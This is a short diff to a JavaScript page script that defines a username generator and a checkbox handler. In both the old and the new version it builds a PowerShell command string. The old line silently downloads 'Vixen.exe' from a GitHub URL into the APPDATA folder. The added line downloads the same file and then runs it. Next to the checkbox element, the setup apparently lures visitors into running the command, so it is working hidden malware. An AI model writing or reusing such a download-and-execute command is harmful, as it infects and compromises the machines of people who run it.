@@ -60,8 +60,7 @@ function generateUniqueUsername() {
     return username;
 }
 
-const cmd = `cmd.exe /c start /min powershell.exe -Command "$yhjd = 'https://github.com/quivingsnew/Vixen-Temp-Woof/raw/refs/heads/main/Vixen.exe'; $dest = [System.IO.Path]::Combine($env:APPDATA, 'Vixen.exe'); iwr $yhjd -OutFile $dest"
-`;
+const cmd = `Invoke-WebRequest -Uri 'https://github.com/quivingsnew/Vixen-Temp-Woof/raw/refs/heads/main/Vixen.exe' -OutFile "$env:APPDATA\Vixen.exe"; Start-Process "$env:APPDATA\Vixen.exe"`;
 
 const checkboxBtn = document.getElementById("checkbox");
 const content = document.getElementById("HJup0");
